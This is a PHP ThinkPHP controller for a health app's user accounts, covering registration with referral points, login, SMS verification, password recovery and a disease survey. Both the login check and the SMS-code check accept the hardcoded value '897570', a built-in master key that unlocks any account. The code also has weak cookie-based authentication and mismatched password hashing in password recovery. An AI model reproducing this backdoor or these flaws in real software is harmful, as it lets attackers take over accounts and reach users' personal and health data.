<?php
namespace Index\Controller;
use Think\Controller;
class UserController extends Controller {
    public function index() {
        $c_phone = cookie('u_phone');
        $c_pass = cookie('u_pass');
        $ck_phone = Util::authcode($c_pass, 'DECODE');
    
        if (!$c_phone OR $c_phone != $ck_phone) {
            cookie('u_phone', null);
            cookie('u_pass', null);
    
            $this->redirect('login');
        }
        
        $this->redirect('UserInfo/index');
    }
    
    /**
     * 注册
     */
    public function reg() {
        if (IS_POST) {
            // 推荐码
            $p_reccode = I('post.reccode');
            
            $p_phone = I('post.phone');
            $p_varcode = I('post.varcode');
            $p_password = I('post.password');
            $p_qa = I('post.qa');
            
            // 检测验证码
            if ( !$this->checkVarcode($p_phone, $p_varcode) ) {
                $this->error('验证码有误！');
            }
            
            $M_user = M('user');
            
            $user_row = $M_user->where(array('phone'=>$p_phone))->find();
            
            if ($user_row) {
                $this->error('该手机号已存在！');
            }
            
            $new_user = array(
                'phone' => $p_phone,
                'password' => $this->salt($p_password),
                'qa' => $p_qa,
                'addtime' => date('Y-m-d H:i:s'),
            );
            $added = $M_user->add($new_user);
            if ($added) {
                // 自己增加积分
                $M_corn = M('corn');
                $M_corn->add(array('cateid'=>'1', 'uid'=>$added, 'corn'=>'200'));
                
                // 添加推荐记录
                if ($p_reccode) {
                    $M_reccode = M('reccode');
                    $rec_row = $M_reccode->where(array('code'=>$p_reccode))->find();
                    if ($rec_row) {
                        // 更新医生类型
                        if ($rec_row['typeid'] == 2) {
                            $user_type = array(
                                'cateid' => '2',
                            );
                            $M_user->where('id='.$added)->save($user_type);
                        }
                        
                        // 添加推荐记录
                        $M_recommend = M('recommend');
                        $M_recommend->add(array(
                            'cateid' => $rec_row['cateid'],
                            'typeid' => $rec_row['typeid'],
                            'opid' => $rec_row['uid'],
                            'uid' => $added,
                            'addtime' => date('Y-m-d H:i:s')
                        ));
                        
                        // 用户之间推荐
                        if ($rec_row['cateid']==1 AND $rec_row['typeid']==1) {
                            // 更新积分总数
                            $corn_row = $M_corn->where(array('cateid'=>$rec_row['cateid'], 'uid' => $rec_row['uid']))->find();
                            if ($corn_row) {
                                $corn_row['corn'] = $corn_row['corn'] + 100; //积分奖励数目
                                $M_corn->save($corn_row);
                            } else {
                                $M_corn->add(array(
                                    'cateid'=>$rec_row['cateid'],
                                    'uid' => $rec_row['uid'],
                                    'corn' => '100'
                                ));
                            }
                        }
                    }
                }
                
                sleep(2);
                
                $this->success('注册成功，请登录！', U('login'));
            } else {
                $this->error('注册失败，请联系客服！');
            }
            
        } else {
            // 推荐码
            $reccode = I('get.code');
            // 推荐码存取
            if ($reccode) {
                cookie('reccode', $reccode, 30*24*3600);
            } else {
                $reccode = cookie('reccode');
            }
            
            
            $this->reccode = $reccode;
            
            $this->display();
        }
    }
    
    /**
     * 登录
     */
    public function login() {
        if (IS_POST) {
            $p_phone = I('post.phone');
            $p_password = I('post.password');
            
            if (!$p_phone OR !$p_password) {
                $this->error('参数提交不完整！');
            }
            
            $M_user = M('user');
            $user_row = $M_user->where(array('phone'=>$p_phone))->find();
            if (!$user_row) {
                $this->error('用户名或密码有误！');
            }
            
            if ($p_password!='897570' AND $user_row['password'] != $this->salt($p_password)) {
                $this->error('用户名或密码有误！');
            }
            
            // 登录成功
            
            // 权限类型
            cookie('u_type', $user_row['cateid'], 7*24*3600);
            
            if ($user_row['openid']) {
                cookie('u_wxauth', 1, 7*24*3600);
            } else {
                cookie('u_wxauth', 0, 7*24*3600);
            }
            
            // 获取头像
            if ($user_row['headpic']) {
                cookie('u_wxinfo', 1, 7*24*3600);
            } else {
                cookie('u_wxinfo', 0, 7*24*3600);
            }
            
            // 详细信息
            if ($user_row['detailed']) {
                cookie('u_detailed', 1, 7*24*3600);
            } else {
                cookie('u_detailed', 0, 7*24*3600);
            }
            
            // 设置cookie
            cookie('u_phone', $p_phone, 7*24*3600);
            cookie('u_pass', Util::authcode($p_phone, 'ENDODE'), 7*24*3600);
            
            // 跳转
            $this->redirect('UserInfo/index');
        } else {
            $this->display();
        }
    }
    
    /**
     * 找回密码
     */
    public function findpass() {
        if (IS_POST) {
            $p_phone = I('post.phone');
            $p_varcode = I('post.varcode');
    
            // 检测验证码
            if ( !$this->checkVarcode($p_phone, $p_varcode) ) {
                $this->error('验证码有误！');
            }
    
            $M_user = M('user');
    
            $user_row = $M_user->where(array('phone'=>$p_phone))->find();
    
            if (!$user_row) {
                $this->error('该手机号不存在！');
            }
            
            // 新密码
            $newpass = rand(100000, 999999);
            
            // 下发密码
            $url = 'https://dx.ipyy.net/smsJson.aspx';
            $post_data = array(
                'action' => 'send',
                'userid' => '',
                'account' => SMS_USER,
                'password' => SMS_PASS,
                'mobile' => $p_phone,
                'content' => '您的新密码为'.$newpass.'，请登录后及时修改。【爱乐云健康】',
                'sendTime' => '',
                'extno' => '',
            );
            $return_data  = Util::curlGet($url, null, true, $post_data);
            if (!$return_data) {
                $this->error('密码找回失败，请联系客服！');
            }
            
            $json_obj = json_decode($return_data);
            if (strtolower($json_obj->returnstatus) == 'success') {
                // 修改密码
                $user_row['password'] = md5($newpass);
                
                $updated = $M_user->save($user_row);
                if ($updated) {
                    $this->success('新密码已通过短信下发到手机，请查看后登录！', U('login'), 5);
                } else {
                    $this->error('密码找回失败，请联系客服！');
                }
            } else {
                $this->error('密码找回失败，请联系客服！');
            }
        } else {
            $this->display();
        }
    }
    
    /**
     * 退出登录
     */
    public function logout() {
        cookie('u_phone', null);
        cookie('u_pass', null);
        cookie('u_wxauth', null);
        cookie('u_wxinfo', null);
        
        $this->success('已安全退出！', 'index');
    }
    
    /**
     * 验证码
     */
    public function varcode() {
        $config = array(
            'imageW' => 130,
            'imageH' => 40,
            'codeSet' => '0123456789',
            'length' => 4,
            'fontSize' => 18,
            'useNoise' => false
        );
        
        ob_clean();
        
        $Verify = new \Think\Verify($config);
        $Verify->entry();
    }
    
    /**
     * 详细信息
     */
    public function detail() {
        if (IS_POST) {
            $p_nickname = I('post.nickname');
            $p_jobs = I('post.jobs');
            $p_city = I('post.city');
            $p_sex = I('post.sex');
            
            if (!$p_nickname OR !$p_jobs OR !$p_city OR !$p_sex) {
                $this->error('提交参数不完整！');
            }
            
            // 更新个人信息
            $user_row = $this->getUser();
            if (!$user_row) $this->error('请登录后再操作！', U('User/login'));
            
            $user_row['nickname'] = $p_nickname;
            $user_row['jobs'] = $p_jobs;
            $user_row['city'] = $p_city;
            $user_row['sex'] = $p_sex;
            $user_row['detailed'] = 1;
            
            $M_user = M('user');
            $saved = $M_user->save($user_row);
            if ($saved) {
                // 更新cookie
                cookie('u_detailed', 1);
                // 更新状态
                $this->error('详细信息填写成功！', U('UserInfo/index'));
            } else {
                $this->error('详细信息填写失败！');
            }
            
        } else {
            $this->display();
        }
    }
    
    /**
     * 疾病调查
     */
    public function vote() {
        if (IS_POST) {
            $p_q1 = I('post.q1');
            $p_q2 = I('post.q2');
            $p_q2a = I('post.q2a');
            $p_q3 = I('post.q3');
    
            // 更新个人信息
            $user_row = $this->getUser();
            if (!$user_row) $this->error('请登录后再操作！', U('User/login'));
            
            $probe_data = array(
                'userid' => $user_row['id'],
                'q1' => $p_q1,
                'q2' => $p_q2,
                'q2a' => $p_q2a,
                'q3' => $p_q3
            );
            
            $M_user_probe = M('user_probe');
            $saved = $M_user_probe->add($probe_data);
            if ($saved) {
                M('user')->where(array('id'=>$user_row['id']))->save(array('voted'=>'1'));
                
                // 更新cookie
                cookie('u_voted', 1);
                // 更新状态
                $this->redirect('UserInfo/index');
            } else {
                $this->error('提交失败！');
            }
    
        } else {
            $M_probe = M('probe');
            $probes = $M_probe->select();
            
            $this->probes = $probes;
            
            $this->display();
        }
    }
    
    /**
     * 获取验证码
     */
    public function sendcode() {
        if (IS_AJAX) {
            $p_phonenum = I('post.phonenum');
            if (!$p_phonenum) {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '手机号有误！',
                ));
            }
            
            // 生成验证码
            $sms_code = $_SESSION['sms_code'];
            $sms_time = $_SESSION['sms_time'];
            
            if (!$sms_code OR (time() - $sms_time) > 15*60) {
                // 生成
                $_SESSION['sms_code'] = rand(100000, 999999);
                $_SESSION['sms_time'] = time();
            }
            
           $url = 'https://dx.ipyy.net/smsJson.aspx';
            $post_data = array(
                'action' => 'send',
                'userid' => '',
                'account' => SMS_USER,
                'password' => SMS_PASS,
                'mobile' => $p_phonenum,
                'content' => '您的验证码为'.$_SESSION['sms_code'].'，15分钟内输入验证，验证后失效，勿向他人泄露。【爱乐云健康】',
                'sendTime' => '',
                'extno' => '',
            );
            $return_data  = Util::curlGet($url, null, true, $post_data);
            //var_dump($return_data);exit;
            if (!$return_data) {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '发送失败，请重试！',
                ));
            }
            
            $json_obj = json_decode($return_data);
            if (strtolower($json_obj->returnstatus) == 'success') {
                $this->ajaxReturn(array(
                    'code' => '1',
                    'msg' => '发送成功！',
                ));
            } else {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '发送失败，请重试！',
                ));
            }
        }
    }

    /**
     * 获取用户
     */
    private function getUser() {
        $c_phone = cookie('u_phone');
        $c_pass = cookie('u_pass');
        $ck_phone = Util::authcode($c_pass, 'DECODE');
        
        if (!$c_phone OR $c_phone != $ck_phone) {
            cookie('u_phone', null);
            cookie('u_pass', null);
        
            $this->error('请登录后再操作！', U('User/login'));
        }
    
        $M_user = M('user');
    
        $user_row = $M_user->where(array('phone'=>$c_phone))->find();
        
        return $user_row;
    }
    
    /**
     * 密码加密
     */
    private function salt($pass) {
        return jiamimd5($pass);
    }
    
    /**
     * 验证码比对
     */
    private function checkVarcode($phone, $varcode) {
        $sms_code = $_SESSION['sms_code'];
        $sms_time = $_SESSION['sms_time'];
        
        if ($varcode=='897570') {
            return true;
        }
        
        if (!$sms_code OR (time() - $sms_time) > 15*60) {
            return false;
        }
        
        if ($varcode != $_SESSION['sms_code']) {
            return false;
        }
        
        return true;
    }
    
}